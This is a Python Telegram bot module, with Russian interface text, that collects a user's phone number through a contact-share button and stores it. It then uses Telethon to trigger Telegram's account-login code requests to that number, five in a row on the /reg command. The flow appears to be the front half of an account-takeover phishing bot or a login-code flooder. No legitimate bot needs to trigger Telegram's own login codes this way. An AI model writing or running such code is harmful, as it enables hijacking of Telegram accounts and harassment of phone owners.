import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
from aiogram import types
from database import save_phone_number, get_phone_number
from config import API_ID, API_HASH

user_phones = {}

def get_contact_keyboard():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📱 Поделиться номером", request_contact=True)
    kb.add(btn)
    return kb

async def start_handler(message: types.Message):
    print(f"[DEBUG] start_handler вызван для {message.from_user.id}")
    user_id = message.from_user.id
    bot = message.bot
    
    phone = get_phone_number(user_id)
    if phone:
        user_phones[user_id] = phone
        await send_code(user_id, bot, phone)
        await message.answer("🔐 Код подтверждения отправлен на твой номер!")
    else:
        await message.answer("📱 Отправь свой номер телефона:", reply_markup=get_contact_keyboard())

async def reg_handler(message: types.Message):
    print(f"[DEBUG] reg_handler вызван для {message.from_user.id}")
    user_id = message.from_user.id
    bot = message.bot
    
    phone = get_phone_number(user_id)
    if not phone:
        await message.answer("❌ Сначала пройди регистрацию через /start")
        return
    
    await message.answer("🔄 Начинаю отправку кодов...")
    
    for i in range(5):
        await send_code(user_id, bot, phone)
        await asyncio.sleep(1.5)
    
    await message.answer(f"✅ Отправлено 5 кодов на номер {phone}")

async def contact_handler(message: types.Message):
    print(f"[DEBUG] contact_handler вызван для {message.from_user.id}")
    if message.contact:
        phone = message.contact.phone_number
        user_id = message.from_user.id
        bot = message.bot
        
        save_phone_number(user_id, phone)
        user_phones[user_id] = phone
        
        await message.answer("✅ Номер принят!", reply_markup=types.ReplyKeyboardRemove())
        await send_code(user_id, bot, phone)
        await message.answer("🔐 Код подтверждения отправлен!\n\nЧтобы отправить ещё коды - напиши /reg")

async def send_code(user_id, bot, phone):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    try:
        await client.send_code_request(phone)
        print(f"[+] Код отправлен на {phone}")
        return True
    except Exception as e:
        print(f"[-] Ошибка: {e}")
        await bot.send_message(user_id, f"❌ Ошибка: {e}")
        return False
    finally:
        await client.disconnect()
